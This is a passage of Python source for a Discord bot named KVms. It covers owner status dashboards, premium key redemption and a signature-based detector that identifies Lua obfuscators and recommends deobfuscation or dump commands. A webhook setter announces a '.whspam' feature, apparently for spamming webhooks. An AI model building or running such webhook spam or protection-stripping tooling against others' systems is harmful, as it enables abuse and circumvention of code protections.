    dump_pending = dump_queue.qsize() if dump_queue is not None else 0
    embed = discord.Embed(
        title=\"KVms - Processing Queue\",
        description=(
            f\"**Active:** `{running}/{MAX_CONCURRENT_JOBS}`\\n\"
            f\"**Waiting:** `{pending}`\\n\"
            f\"**.l pending:** `{dump_pending}`\"
        ),
        color=GOOD if pending == 0 else WARN,
        timestamp=datetime.now(),
    )
    embed.set_footer(text=_make_footer())
    await ctx.reply(embed=embed, mention_author=False)


@bot.command(name=\"health\", hidden=True)
async def health_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    running, pending = await _job_queue_snapshot()
    uptime = max(0, int(time.time() - BOT_STARTED_AT))
    days, rem = divmod(uptime, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, seconds = divmod(rem, 60)
    uptime_text = f\"{days}d {hours}h {minutes}m {seconds}s\"
    backends = {
        \"obf\": (ROOT / \"obf.py\").exists(),
        \"v1\": (ROOT / \"v1.lua\").exists(),
        \"lph\": (ROOT / \"lph.py\").exists(),
        \"lune\": os.path.exists(LUNE_BIN),
    }
    backend_text = \" | \".join(
        f\"{name}: {'OK' if available else 'missing'}\"
        for name, available in backends.items()
    )
    latency = getattr(bot, \"latency\", 0.0)
    if psutil is not None:
        try:
            process = psutil.Process()
            memory_text = f\"{process.memory_info().rss / 1024 / 1024:.1f} MB\"
            cpu_text = f\"{process.cpu_percent(interval=None):.1f}%\"
        except Exception:
            memory_text, cpu_text = \"unavailable\", \"unavailable\"
    elif resource is not None:
        try:
            # Linux reports ru_maxrss in KB; this is a peak value.
            memory_text, cpu_text = f\"{resource.getrusage(resource.RUSAGE_SELF).ru_maxrss / 1024:.1f} MB\", \"unavailable\"
        except Exception:
            memory_text, cpu_text = \"unavailable\", \"unavailable\"
    else:
        memory_text, cpu_text = \"unavailable\", \"unavailable\"
    embed = discord.Embed(
        title=\"KVms - Health\",
        color=GOOD if all(backends.values()) else WARN,
        timestamp=datetime.now(),
    )
    embed.add_field(name=\"Uptime\", value=f\"`{uptime_text}`\", inline=True)
    embed.add_field(name=\"Latency\", value=f\"`{latency * 1000:.0f} ms`\", inline=True)
    embed.add_field(name=\"Queue\", value=f\"`{running} active | {pending} waiting`\", inline=True)
    embed.add_field(name=\".l pending\", value=f\"`{dump_queue.qsize() if dump_queue else 0}`\", inline=True)
    embed.add_field(name=\"Proxies\", value=f\"`{proxy_manager.count()} working`\", inline=True)
    embed.add_field(name=\"Memory\", value=f\"`{memory_text}`\", inline=True)
    embed.add_field(name=\"CPU\", value=f\"`{cpu_text}`\", inline=True)
    embed.add_field(name=\"Pastefy\", value=f\"`{'configured' if PASTEFY_TOKEN and PASTEFY_API else 'not configured'}`\", inline=True)
    embed.add_field(name=\"Backends\", value=f\"```{backend_text}```\", inline=False)
    embed.set_footer(text=\"KVms | Owner Only\")
    await ctx.reply(embed=embed)


@bot.command(name=\"dashboard\", aliases=[\"dash\"], hidden=True)
async def dashboard_command(ctx):
    if ctx.author.id != OWNER_ID:
        return
    running, pending = await _job_queue_snapshot()
    resources = _sample_process_resources()
    async with _user_job_lock:
        reserved_users = len(_user_job_states)
    task_lines = []
    for name, task in _background_tasks.items():
        task_lines.append(f\"{name}: {'running' if task is not None and not task.done() else 'stopped'}\")
    task_text = \"\\n\".join(task_lines) or \"none\"
    aggregate_commands = {}
    for user_stats in cmd_stats.values():
        for command, count in user_stats.items():
            aggregate_commands[command] = aggregate_commands.get(command, 0) + count
    top_commands = sorted(aggregate_commands.items(), key=lambda item: -item[1])[:8]
    top_text = \", \".join(f\".{name}: {count}\" for name, count in top_commands) or \"none\"
    memory = resources.get(\"memory_mb\")
    cpu = resources.get(\"cpu_percent\")
    resource_text = (
        f\"memory: `{memory:.1f} MB` | CPU: `{cpu:.1f}%`\"
        if memory is not None and cpu is not None
        else \"resource metrics unavailable\"
    )
    embed = discord.Embed(
        title=\"KVms - Owner Dashboard\",
        description=\"live bot, queue, resource, and usage overview\",
        color=GOOD,
        timestamp=datetime.now(),
    )
    embed.add_field(name=\"Queue\", value=f\"`{running}/{MAX_CONCURRENT_JOBS} active | {pending} waiting`\", inline=False)
    embed.add_field(name=\"Reserved users\", value=f\"`{reserved_users}`\", inline=True)
    embed.add_field(name=\".l pending\", value=f\"`{dump_queue.qsize() if dump_queue else 0}`\", inline=True)
    embed.add_field(name=\"Premium users\", value=f\"`{len(premium_users)}`\", inline=True)
    embed.add_field(name=\"Resources\", value=resource_text, inline=False)
    embed.add_field(name=\"Background tasks\", value=f\"```\\n{task_text[:1000]}\\n```\", inline=False)
    embed.add_field(name=\"Top commands\", value=f\"`{top_text[:1000]}`\", inline=False)
    embed.set_footer(text=\"KVms | Owner Only\")
    await ctx.reply(embed=embed)


# =========================
# SETWEBHOOK (owner)
# =========================
@bot.command(name=\"setwebhook\", hidden=True)
async def setwebhook_command(ctx, url: str = None):
    if ctx.author.id != OWNER_ID:
        return
    global WEBHOOK_URL
    if not url:
        return await ctx.reply(\"`.setwebhook <webhook_url>`\", delete_after=10)
    if not url.startswith((\"http://\", \"https://\")):
        return await ctx.reply(\"that's not a valid url\", delete_after=10)
    WEBHOOK_URL = url.strip()
    _save_webhook(WEBHOOK_URL)
    await ctx.reply(f\"webhook set & saved - `.whspam` is ready\", delete_after=15)

# =========================
# SUPPORT (owner secret obfuscator lookup)
# =========================
@bot.command(name=\"support\", aliases=[\"obflist\", \"obfs\"], hidden=True)
async def support_command(ctx, *, name: str = None):
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    if not name:
        if obfuscator_db:
            rows = []
            for key in sorted(obfuscator_db):
                entry = obfuscator_db.get(key) or {}
                recommendation = _safe_detector_recommendation(entry.get(\"recommendation\"), \"unknown\")
                patterns = entry.get(\"patterns\", [])
                pattern_count = len(patterns) if isinstance(patterns, list) else (1 if patterns else 0)
                sample_sets = _entry_sample_sets(entry)
                signature_count = sum(len(sample.get(\"signatures\", [])) for sample in sample_sets)
                rows.append(f\"`{key}` †’ `{_strip_mentions(recommendation)}` | `{pattern_count} patterns` | \"
                            f\"`{signature_count} signatures/{len(sample_sets)} samples`\")
            listing = \"\\n\".join(rows)
        else:
            listing = \"no obfuscators added yet\"
        if len(listing) > 3500:
            listing = listing[:3490] + \"\\n... use `.obfshow <name>` for details\"
        embed = discord.Embed(
            title=\"Obfuscators in detector database\",
            description=(f\"`.support <name>` for details\\n\"
                         f\"`.obflist` / `.obfs` shows this list\\n\\n{listing}\"),
            color=ACCENT)
        embed.set_footer(text=\"KVms | Owner Only | DO NOT SHARE\")
        return await ctx.reply(embed=embed)

    key = name.lower().strip()
    entry = obfuscator_db.get(key)
    if entry is None:
        # fuzzy: check if it's a substring of any known name
        matches = [k for k in obfuscator_db if key in k or k in key]
        if matches:
            hint = \"did you mean: \" + \", \".join(f\"`{k}`\" for k in sorted(matches))
        else:
            hint = \"not supported - use `.addobf <nama>` to add it\"
        embed = discord.Embed(title=f\"Support: {name}\", description=hint, color=WARN)
        embed.set_footer(text=\"KVms | Owner Only\")
        return await ctx.reply(embed=embed)

    embed = discord.Embed(
        title=f\"Support: {key}\",
        description=entry.get(\"description\", key),
        color=GOOD)
    embed.add_field(name=\"Recommendation\", value=f\"`{_safe_detector_recommendation(entry.get('recommendation'), 'unknown')}`\", inline=True)
    pats = entry.get(\"patterns\", [])
    if isinstance(pats, str):
        pats = [pats]
    elif not isinstance(pats, (list, tuple)):
        pats = []
    sample_sets = _entry_sample_sets(entry)
    signature_count = sum(len(sample.get(\"signatures\", [])) for sample in sample_sets)
    embed.add_field(name=\"Counts\",
                    value=f\"patterns: `{len(pats)}` | signatures: `{signature_count}` | samples: `{len(sample_sets)}`\",
                    inline=True)
    embed.add_field(name=\"Patterns\", value=\", \".join(f\"`{p}`\" for p in pats[:12]) or \"-\", inline=False)
    notes = entry.get(\"notes\", \"\")
    if notes:
        embed.add_field(name=\"Notes\", value=_strip_mentions(str(notes))[:1000], inline=False)
    stats = entry.get(\"stats\") if isinstance(entry.get(\"stats\"), dict) else {}
    try:
        hit_count = max(0, int(stats.get(\"hits\", 0) or 0))
    except (TypeError, ValueError):
        hit_count = 0
    embed.add_field(name=\"Detector hits\", value=f\"`{hit_count}`\", inline=True)
    embed.set_footer(text=\"KVms | Owner Only | DO NOT SHARE\")
    await ctx.reply(embed=embed)

@bot.command(name=\"obfshow\", aliases=[\"obfinfo\"], hidden=True)
async def obfshow_command(ctx, *, name: str = None):
    \"\"\"Show one detector entry, including patterns and recommendation.\"\"\"
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    key = (name or \"\").strip().lower()
    if not key:
        return await ctx.reply(\"`.obfshow <obf_name>`\", delete_after=12)
    entry = obfuscator_db.get(key)
    if not isinstance(entry, dict):
        return await ctx.reply(f\"`{key}` is not in the detector database\", delete_after=12)
    patterns = entry.get(\"patterns\", [])
    if isinstance(patterns, str):
        patterns = [patterns]
    elif not isinstance(patterns, (list, tuple)):
        patterns = []
    patterns = [str(pattern) for pattern in patterns if str(pattern).strip()]
    embed = discord.Embed(
        title=f\"Detector entry: {key}\",
        description=_strip_mentions(str(entry.get(\"description\") or f\"{key} obfuscator\")),
        color=ACCENT)
    embed.add_field(name=\"Recommendation\",
                    value=f\"`{_strip_mentions(_safe_detector_recommendation(entry.get('recommendation'), 'unknown'))}`\",
                    inline=True)
    sample_sets = _entry_sample_sets(entry)
    signature_count = sum(len(sample.get(\"signatures\", [])) for sample in sample_sets)
    embed.add_field(name=\"Pattern count\", value=f\"`{len(patterns)}`\", inline=True)
    embed.add_field(name=\"Signature/sample count\",
                    value=f\"`{signature_count} signatures` / `{len(sample_sets)} samples`\", inline=True)
    embed.add_field(name=\"Window info\",
                    value=\"`100 chars`: first-100, distributed windows, last-100; comments masked\",
                    inline=False)
    pattern_text = \"\\n\".join(
        f\"`{_strip_mentions(pattern)}`\" for pattern in patterns[:30])
    embed.add_field(name=\"Patterns\", value=pattern_text[:1000] or \"-\", inline=False)
    notes = str(entry.get(\"notes\") or \"\")
    if notes:
        embed.add_field(name=\"Notes\", value=_strip_mentions(notes)[:1000], inline=False)
    stats = entry.get(\"stats\") if isinstance(entry.get(\"stats\"), dict) else {}
    embed.add_field(name=\"Detector hits\", value=f\"`{int(stats.get('hits', 0) or 0)}`\", inline=True)
    embed.set_footer(text=\"KVms | Owner Only | detector database\")
    await ctx.reply(embed=embed)

# =========================
# ADDOBF / DELOBF (owner: manage the supported obfuscator list)
# =========================
@bot.command(name=\"addobf\", hidden=True)
async def addobf_command(ctx, *, name: str = None):
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    if not name:
        return await ctx.reply(\"`.addobf <nama>` - mark an obfuscator as supported\", delete_after=10)
    name = name.strip()
    if not _valid_obf_name(name):
        return await ctx.reply(\"invalid name - letters/numbers only, max 40 chars\", delete_after=10)
    key = name.lower()
    if key in obfuscator_db:
        return await ctx.reply(f\"`{key}` is already supported\", delete_after=10)
    obfuscator_db[key] = {
        \"patterns\":       [key],
        \"sample_sets\":    [],
        \"signatures\":     [],
        \"recommendation\": \".deobf\",
        \"description\":    f\"{key} obfuscator\",
        \"notes\":          \"\",
    }
    _save_obfuscator_db(obfuscator_db)
    embed = discord.Embed(description=f\"`{key}` is now **supported**\", color=GOOD)
    embed.set_footer(text=\"KVms | Owner Panel\")
    await ctx.reply(embed=embed, delete_after=15)

@bot.command(name=\"delobf\", hidden=True)
async def delobf_command(ctx, *, name: str = None):
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    if not name:
        return await ctx.reply(\"`.delobf <nama>` - remove a supported obfuscator\", delete_after=10)
    key = name.strip().lower()
    if key not in obfuscator_db:
        return await ctx.reply(f\"`{key}` isn't in the supported list\", delete_after=10)
    del obfuscator_db[key]
    _save_obfuscator_db(obfuscator_db)
    embed = discord.Embed(description=f\"`{key}` removed from the supported list\", color=WARN)
    embed.set_footer(text=\"KVms | Owner Panel\")
    await ctx.reply(embed=embed, delete_after=15)

# =========================
# OBFUSCATOR PATTERN / METADATA CONTROLS (owner-only)
# =========================
@bot.command(name=\"obfpat\", hidden=True)
async def obfpat_command(ctx, *, args: str = None):
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    parts = (args or \"\").strip().split(maxsplit=1)
    if len(parts) < 2:
        return await ctx.reply(\"`.obfpat <obf_name> <pattern>`\", delete_after=12)
    name, pattern = parts[0].strip().lower(), parts[1].strip()
    if name not in obfuscator_db:
        return await ctx.reply(f\"`{name}` is not in the detector database - use `.addobf {name}` first\", delete_after=12)
    if not pattern or len(pattern) > 500:
        return await ctx.reply(\"pattern must be between 1 and 500 characters\", delete_after=12)
    entry = obfuscator_db.setdefault(name, {})
    patterns = entry.get(\"patterns\", [])
    if isinstance(patterns, str):
        patterns = [patterns]
    patterns = [str(value).strip() for value in patterns if str(value).strip()]
    if pattern not in patterns:
        patterns.append(pattern)
    entry[\"patterns\"] = patterns[:MAX_PATTERNS_PER_ENTRY]
    entry.setdefault(\"recommendation\", \".deobf\")
    entry.setdefault(\"notes\", \"\")
    entry.setdefault(\"description\", f\"{name} obfuscator\")
    _save_obfuscator_db(obfuscator_db)
    await ctx.reply(f\"saved pattern for `{name}`\", delete_after=15)


@bot.command(name=\"obfmeta\", hidden=True)
async def obfmeta_command(ctx, *, args: str = None):
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    parts = (args or \"\").strip().split(maxsplit=2)
    if len(parts) < 2:
        return await ctx.reply(\"`.obfmeta <obf_name> <recommended_command> [notes]`\", delete_after=12)
    name, recommendation = parts[0].strip().lower(), parts[1].strip()
    notes = parts[2].strip() if len(parts) > 2 else \"\"
    if name not in obfuscator_db:
        return await ctx.reply(f\"`{name}` is not in the detector database - use `.addobf {name}` first\", delete_after=12)
    if not recommendation.startswith(\".\") or len(recommendation) > 80 or _safe_detector_recommendation(recommendation) != recommendation.lower().strip():
        return await ctx.reply(\"recommendation must be a current command such as `.deobf`\", delete_after=12)
    entry = obfuscator_db.setdefault(name, {})
    entry[\"recommendation\"] = recommendation
    entry[\"notes\"] = notes[:1000]
    entry.setdefault(\"patterns\", [name])
    entry.setdefault(\"description\", f\"{name} obfuscator\")
    _save_obfuscator_db(obfuscator_db)
    await ctx.reply(f\"updated `{name}` recommendation and notes\", delete_after=15)

# =========================
# REDEEM KEY
# =========================
@bot.command(name=\"redeem\")
async def redeem_command(ctx, key: str = None):
    if not key:
        return await _safe_reply(ctx.message, content=\"`.redeem <key>`\")
    uid = ctx.author.id
    if key not in keys_db:
        return await _safe_reply(ctx.message, content=f\"{EMOJI_FAIL} that key doesn't exist\")
    kdata = keys_db[key]
    if kdata.get(\"claimed_by\") is not None:
        return await _safe_reply(ctx.message, content=f\"{EMOJI_FAIL} already redeemed by someone else\")
    exp = kdata.get(\"expiry\")
    premium_users[uid] = exp
    kdata[\"claimed_by\"] = uid
    kdata[\"claimed_at\"] = time.time()
    _save_premium(premium_users)
    _save_keys(keys_db)
    assigned = await _assign_premium_role(ctx.author, ctx.guild)
    exp_str = \"Lifetime\" if exp is None else datetime.fromtimestamp(exp).strftime(\"%Y-%m-%d %H:%M UTC\")
    role_note = (f\"\\n**role syncs now:** {assigned}\" if ctx.guild is not None else
                 f\"\\n**role syncs now:** {assigned}; remaining guilds sync when you are available\")
    embed = discord.Embed(description=f\"ƒ‚‚ premium activated\\n**expires:** {exp_str}{role_note}\", color=GOOD)
    embed.set_footer(text=_make_footer())
    await _safe_reply(ctx.message, embed=embed, mention_author=False)

# =========================
# DETECT / DTC
# =========================
@bot.command(name=\"detect\", aliases=[\"dtc\"])
async def detect_command(ctx):
    if not is_allowed(ctx.message):
        return
    if not await _ensure_tos(ctx.message):
        return

    lua_code = None
    # Check attachments
    for att in ctx.message.attachments:
        if att.filename.endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                    break
            except Exception:
                pass

    # Check reply
    if not lua_code and ctx.message.reference:
        try:
            ref = (ctx.message.reference.resolved or
                   await ctx.channel.fetch_message(ctx.message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    # Check URL or inline code
    if not lua_code:
        content = ctx.message.content
        parts = content.split(maxsplit=1)
        if len(parts) > 1:
            after = parts[1].strip()
            if after.startswith((\"http://\", \"https://\")):
                try:
                    s = await ctx.reply(f\"{EMOJI_LOADING} fetching...\")
                    raw = await fetch_from_url(after.split()[0])
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
                    await s.delete()
                except Exception as e:
                    em = discord.Embed(
                        description=f\"couldn't fetch: `{_strip_mentions(_sanitize_error(str(e)))}`\",
                        color=BAD)
                    return await ctx.reply(embed=em)
            else:
                cb = LUA_CODEBLOCK.search(content)
                lua_code = cb.group(1).strip() if cb else after

    if not lua_code:
        return await ctx.reply(\"`.detect <code|url|reply|file>` - give me something to look at\")

    t_start = time.perf_counter()
    result = _detect_obfuscator(lua_code)
    took = time.perf_counter() - t_start

    if result:
        name, recommendation, description, notes, confidence, match_info = result
        _record_detector_hit(name, match_info, confidence)
        embed = discord.Embed(
            title=\"Obfuscator Detected\",
            color=GOOD if confidence >= 75 else WARN,
            timestamp=datetime.now()
        )
        embed.add_field(name=\"Obfuscator\",      value=f\"`{_strip_mentions(name)}`\",           inline=True)
        embed.add_field(name=\"Recommended cmd\", value=f\"`{_strip_mentions(recommendation)}`\", inline=True)
        embed.add_field(name=\"Confidence\",      value=f\"`{confidence}%`\",                     inline=True)
        regions = \", \".join(_strip_mentions(str(value)) for value in
                              (match_info or {}).get(\"matched_regions\", [])) or \"heuristic / not stored\"
        embed.add_field(name=\"Matched regions\", value=f\"`{regions[:500]}`\", inline=False)
        embed.add_field(name=\"Matched counts\",
                        value=(f\"patterns: `{(match_info or {}).get('matched_pattern_count', 0)}` | \"
                               f\"signatures: `{(match_info or {}).get('matched_signature_count', 0)}`\"),
                        inline=True)
        if notes:
            embed.add_field(name=\"Notes\", value=_strip_mentions(notes)[:1000], inline=False)
        embed.set_footer(text=_make_footer(took))
        await ctx.reply(embed=embed, view=DetectView(recommendation))
    else:
        if _looks_plain(lua_code):
            embed = discord.Embed(
                title=\"No Obfuscation Detected\",
                description=(\"this looks like a plain Lua script - no known obfuscator matched.\\n\"
                             \"if it still misbehaves, try `.deobf` or `.l`\"),
                color=GOOD,
                timestamp=datetime.now()
            )
            embed.add_field(name=\"Confidence\", value=\"`0%`\", inline=True)
            embed.add_field(name=\"Matched regions\", value=\"`none`\", inline=True)
            embed.add_field(name=\"Matched counts\", value=\"patterns: `0` | signatures: `0`\", inline=True)
            embed.set_footer(text=_make_footer(took))
            await ctx.reply(embed=embed)
        else:
            embed = discord.Embed(
                title=\"Unknown Obfuscator\",
                description=(f\"couldn't match this to any known obfuscator\\n\\n\"
                             f\"try `.deobf`, `.l`, `.l2`, or `.l3` - one of those usually works\"),
                color=WARN,
                timestamp=datetime.now()
            )
            embed.add_field(name=\"Confidence\", value=\"`0%`\", inline=True)
            embed.set_footer(text=_make_footer(took))
            await ctx.reply(embed=embed)

class ObfSampleConfirmView(discord.ui.View):
    \"\"\"Owner confirmation before a sample changes the detector database.\"\"\"
    def __init__(self, owner_id: int, obf_name: str, patterns: list,
                 signatures: list, recommendation: str, notes: str):
        super().__init__(timeout=120)
        self.owner_id = owner_id
        self.obf_name = obf_name
        self.patterns = patterns
        self.signatures = signatures
        self.recommendation = recommendation
        self.notes = notes
        save_button = discord.ui.Button(label=\"Save sample\", style=ButtonStyle.success,
                                        custom_id=\"obf_sample_save\")
        cancel_button = discord.ui.Button(label=\"Cancel\", style=ButtonStyle.danger,
                                          custom_id=\"obf_sample_cancel\")
        save_button.callback = self.save_sample
        cancel_button.callback = self.cancel
        self.add_item(save_button)
        self.add_item(cancel_button)

    async def _owned(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.owner_id:
            await interaction.response.send_message(\"this sample belongs to the owner\", ephemeral=True)
            return False
        return True

    async def save_sample(self, interaction: discord.Interaction):
        if not await self._owned(interaction):
            return
        existing = obfuscator_db.get(self.obf_name, {})
        if not isinstance(existing, dict):
            existing = {}
        existing_patterns = existing.get(\"patterns\", [])
        if isinstance(existing_patterns, str):
            existing_patterns = [existing_patterns]
        merged_patterns = []
        for pattern in list(existing_patterns) + list(self.patterns):
            pattern = str(pattern).strip()
            if pattern and pattern not in merged_patterns:
                merged_patterns.append(pattern)
        merged_patterns = merged_patterns[:MAX_PATTERNS_PER_ENTRY]

        # Each Save sample appends one independent bounded signature set. The
        # source itself is discarded; only first/distributed/last windows remain.
        existing_sets = _entry_sample_sets(existing)
        new_set = {
            \"sample_id\": secrets.token_hex(8),
            \"patterns\": [str(pattern).strip() for pattern in self.patterns[:MAX_PATTERNS_PER_ENTRY]
                         if str(pattern).strip()][:MAX_PATTERNS_PER_ENTRY],
            \"signatures\": [str(signature)[:DETECTION_WINDOW_SIZE]
                           for signature in self.signatures[:MAX_SIGNATURES_PER_SAMPLE]
                           if len(str(signature)) >= 35],
            \"window_size\": DETECTION_WINDOW_SIZE,
        }
        sample_sets = (existing_sets + [new_set])[-MAX_SAMPLE_SETS:]
        flattened_signatures = []
        for sample in sample_sets:
            for signature in sample.get(\"signatures\", []):
                if signature not in flattened_signatures:
                    flattened_signatures.append(signature)
        new_entry = dict(existing)
        new_entry.update({
            \"patterns\": merged_patterns,
            \"sample_sets\": sample_sets,
            # Keep a bounded legacy view for older tooling; detection uses the
            # independent sample_sets above.
            \"signatures\": flattened_signatures[:MAX_SAMPLE_SETS * MAX_SIGNATURES_PER_SAMPLE],
            \"recommendation\": self.recommendation,
            \"description\": existing.get(\"description\") or f\"{self.obf_name} obfuscator\",
            \"notes\": self.notes or existing.get(\"notes\", \"\"),
        })
        candidate_db = dict(obfuscator_db)
        candidate_db[self.obf_name] = new_entry
        if not _save_obfuscator_db(candidate_db):
            return await interaction.response.edit_message(
                content=\"detector sample was not saved because the bounded database could not be written\",
                embed=None, view=None)
        obfuscator_db.clear()
        obfuscator_db.update(candidate_db)
        for item in self.children:
            item.disabled = True
        embed = discord.Embed(
            title=f\"Saved `{self.obf_name}` to detector DB\",
            description=\"The new sample set was appended; full source was not saved.\", color=GOOD)
        saved_pattern_text = \"\\n\".join(
            f\"`{_strip_mentions(pattern)}`\" for pattern in merged_patterns[:30])
        embed.add_field(name=\"Patterns\", value=saved_pattern_text[:1000] or \"-\", inline=False)
        embed.add_field(name=\"Recommendation\",
                        value=f\"`{_strip_mentions(self.recommendation)}`\", inline=True)
        embed.add_field(name=\"Sample/signature sets\",
                        value=f\"`{len(sample_sets)} samples` | `{len(flattened_signatures)} signatures`\",
                        inline=True)
        if self.notes:
            embed.add_field(name=\"Notes\", value=_strip_mentions(self.notes)[:1000], inline=False)
        embed.set_footer(text=\"KVms | Owner Panel\")
        await interaction.response.edit_message(embed=embed, view=self)
        self.stop()

    async def cancel(self, interaction: discord.Interaction):
        if not await self._owned(interaction):
            return
        self.stop()
        await interaction.response.edit_message(
            content=\"detector sample was not saved\", embed=None, view=None)


def _sample_detector_patterns(lua_code: str, obf_name: str) -> list:
    \"\"\"Extract distinctive candidates from distributed sample windows.\"\"\"
    patterns = []
    for value in [obf_name] + _detection_windows(_mask_lua_comments(lua_code)):
        words = re.findall(r\"[A-Za-z][A-Za-z0-9_]{4,79}\", str(value or \"\"))
        for word in words:
            word = word.lower()
            if (word in _DETECTION_WEAK_PATTERNS or len(word) < 6 or
                    len(set(word.replace(\"_\", \"\"))) <= 2):
                continue
            if word not in patterns:
                patterns.append(word)
            if len(patterns) >= 8:
                return patterns
    return patterns


def _sample_detector_signatures(lua_code: str) -> list:
    \"\"\"Capture first, middle, distributed, and last 100-character windows.\"\"\"
    return [str(window)[:DETECTION_WINDOW_SIZE]
            for window in _detection_windows(_mask_lua_comments(lua_code))
            if len(str(window)) >= 35]


# =========================
# INPDTC (owner: add obfuscator pattern)
# =========================
@bot.command(name=\"inpdtc\", hidden=True)
async def inpdtc_command(ctx, *, args: str = None):
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    if not args:
        return await ctx.reply(\"`.inpdtc <file|url|code|reply> <obf_name> [recommendation] [notes]`\\n\"
                               \"example: `.inpdtc https://example.com/test.lua mynewobf .deobf`\", delete_after=15)

    lua_code = None
    obf_name = None
    recommendation = \".deobf\"
    notes = \"\"

    # 1) Attachment?
    for att in ctx.message.attachments:
        if att.filename.endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
            except Exception:
                pass

    tokens = args.strip().split()

    if not lua_code and getattr(ctx.message, \"reference\", None):
        try:
            ref = (ctx.message.reference.resolved or
                   await ctx.message.channel.fetch_message(ctx.message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    if lua_code:
        # attachment/reply -> args = <name> [recommendation] [notes...]
        if not tokens:
            return await ctx.reply(\"need an obfuscator name\", delete_after=8)
        obf_name       = tokens[0]
        recommendation = tokens[1] if len(tokens) > 1 else \".deobf\"
        notes          = \" \".join(tokens[2:]) if len(tokens) > 2 else \"\"
    else:
        # 2) Codeblock in the message?
        cb = LUA_CODEBLOCK.search(args)
        if cb:
            lua_code = cb.group(1).strip()
            rest_text = LUA_CODEBLOCK.sub(\" \", args).strip().split()
            if not rest_text:
                return await ctx.reply(\"need an obfuscator name\", delete_after=8)
            obf_name       = rest_text[0]
            recommendation = rest_text[1] if len(rest_text) > 1 else \".deobf\"
            notes          = \" \".join(rest_text[2:]) if len(rest_text) > 2 else \"\"
        elif tokens and tokens[0].startswith((\"http://\", \"https://\")):
            # 3) URL = tokens[0], then <name> [recommendation] [notes...]
            source = tokens[0]
            rest   = tokens[1:]
            try:
                s = await ctx.reply(f\"{EMOJI_LOADING} fetching...\")
                raw      = await fetch_from_url(source)
                lua_code = raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
                await s.delete()
            except Exception as e:
                return await ctx.reply(
                    f\"fetch failed: `{_strip_mentions(_sanitize_error(str(e)))[:1000]}`\",
                    delete_after=10,
                )
            if not lua_code:
                return await ctx.reply(\"url came back empty\", delete_after=10)
            if not rest:
                return await ctx.reply(\"need an obfuscator name\", delete_after=8)
            obf_name       = rest[0]
            recommendation = rest[1] if len(rest) > 1 else \".deobf\"
            notes          = \" \".join(rest[2:]) if len(rest) > 2 else \"\"
        else:
            return await ctx.reply(
                \"give me the script via attachment, ```codeblock```, reply, or url - \"
                \"format: `.inpdtc <file|url|code|reply> <obf_name> [recommendation] [notes]`\",
                delete_after=15)

    if not lua_code or not obf_name:
        return await ctx.reply(\"something went wrong - give me: source, name, and optionally a recommendation\", delete_after=10)
    if not _source_within_input_limit(lua_code):
        return await ctx.reply(\"input too large (maximum 8 MB)\", delete_after=10)

    # Validate the name so garbage never enters the db (this is what caused
    # the broken \"regex\" entries that showed up in .help).
    if not _valid_obf_name(obf_name):
        return await ctx.reply(\"invalid obfuscator name - letters/numbers only, max 40 chars\", delete_after=10)

    obf_name = obf_name.strip().lower()

    if not recommendation.startswith(\".\") or len(recommendation) > 80 or _safe_detector_recommendation(recommendation) != recommendation.lower().strip():
        return await ctx.reply(\"recommendation must be a current command such as `.deobf`\", delete_after=12)
    recommendation = recommendation.lower()
    obf_name = obf_name.strip().lower()
    notes = notes[:1000]
    sample_patterns = _sample_detector_patterns(lua_code, obf_name)
    sample_signatures = _sample_detector_signatures(lua_code)
    if not sample_patterns and not sample_signatures:
        return await ctx.reply(\"no usable signatures found in that sample\", delete_after=12)

    existing = obfuscator_db.get(obf_name, {})
    existing_patterns = existing.get(\"patterns\", []) if isinstance(existing, dict) else []
    if isinstance(existing_patterns, str):
        existing_patterns = [existing_patterns]
    preview_patterns = []
    for pattern in list(existing_patterns) + sample_patterns:
        pattern = str(pattern).strip()
        if pattern and pattern not in preview_patterns:
            preview_patterns.append(pattern)
    embed = discord.Embed(
        title=\"Confirm detector sample\",
        description=(f\"Save sample data for `{_strip_mentions(obf_name)}`?\\n\"
                     \"Bounded signatures and pattern metadata will be stored; the full sample is not saved.\"),
        color=ACCENT, timestamp=datetime.now())
    sample_pattern_text = \"\\n\".join(
        f\"`{_strip_mentions(pattern)}`\" for pattern in preview_patterns[:30])
    embed.add_field(name=\"Patterns to save\", value=sample_pattern_text[:1000] or \"-\", inline=False)
    existing_sample_count = len(_entry_sample_sets(existing))
    embed.add_field(name=\"New signature windows\", value=f\"`{len(sample_signatures)}` (first/middle/last regions)\", inline=True)
    embed.add_field(name=\"Sample sets\", value=f\"`{existing_sample_count}` existing †’ `{existing_sample_count + 1}` after Save\", inline=True)
    embed.add_field(name=\"Recommendation\",
                    value=f\"`{_strip_mentions(recommendation)}`\", inline=True)
    if notes:
        embed.add_field(name=\"Notes\", value=_strip_mentions(notes)[:1000], inline=False)
    embed.set_footer(text=\"Press Save sample to update the private detector database\")
    await ctx.reply(embed=embed, view=ObfSampleConfirmView(
        ctx.author.id, obf_name, sample_patterns, sample_signatures,
        recommendation, notes))


@bot.command(name=\"obftest\", hidden=True)
async def obftest_command(ctx, *, args: str = None):
    \"\"\"Test a source without changing signatures; only bounded hit statistics update.\"\"\"
    if ctx.author.id != OWNER_ID or ctx.guild is not None:
        return
    args = (args or \"\").strip()
    lua_code = None
    expected = None

    for att in getattr(ctx.message, \"attachments\", []) or []:
        if getattr(att, \"filename\", \"\").lower().endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                    break
            except Exception:
                pass

